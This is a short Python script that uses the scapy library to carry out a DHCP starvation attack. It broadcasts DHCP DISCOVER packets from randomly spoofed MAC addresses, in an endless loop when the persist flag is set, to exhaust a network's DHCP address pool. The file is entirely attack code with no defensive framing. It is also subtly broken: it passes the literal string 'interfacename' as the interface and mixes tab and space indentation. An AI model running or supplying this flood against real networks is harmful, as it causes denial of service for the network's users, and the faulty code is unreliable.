from scapy.all import *
import random
import socket
import argparse

parser=argparse.ArgumentParser(description="Process some varubales")
parser.add_argument('-iface',help= 'enter interface for dhcp flood to work on',type=str)
parser.add_argument('-persist',help= 'enter if to -persist attack',type=int)
args=parser.parse_args()


def random_mac():
	return "%02x:%02x:%02x:%02x:%02x:%02x" % (random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255))


def dhcpflood(interfacename,p):
	if(p):
	 	while(True):
			macaddress=random_mac()
			ether=Ether(dst="ff:ff:ff:ff:ff:ff", src=macaddress,type=0x800)
			ip=IP(src="0.0.0.0",dst="255.255.255.255")
			udp=UDP(sport=68,dport=67)
			boot=BOOTP(chaddr=macaddress,xid=0x10000000)
			dhcp=DHCP(options=[("message-type","discover"),("end")])
			packet=ether/ip/udp/boot/dhcp
			sendp(packet,iface="interfacename")
	else:
		macaddress = random_mac()
		ether = Ether(dst="ff:ff:ff:ff:ff:ff", src=macaddress, type=0x800)
		ip = IP(src="0.0.0.0", dst="255.255.255.255")
		udp = UDP(sport=68, dport=67)
		boot = BOOTP(chaddr=macaddress, xid=0x10000000)
		dhcp = DHCP(options=[("message-type", "discover"), ("end")])
		packet = ether / ip / udp / boot / dhcp
		sendp(packet, iface="interfacename")
		#print(packet.show())

dhcpflood(args.iface,args.persist)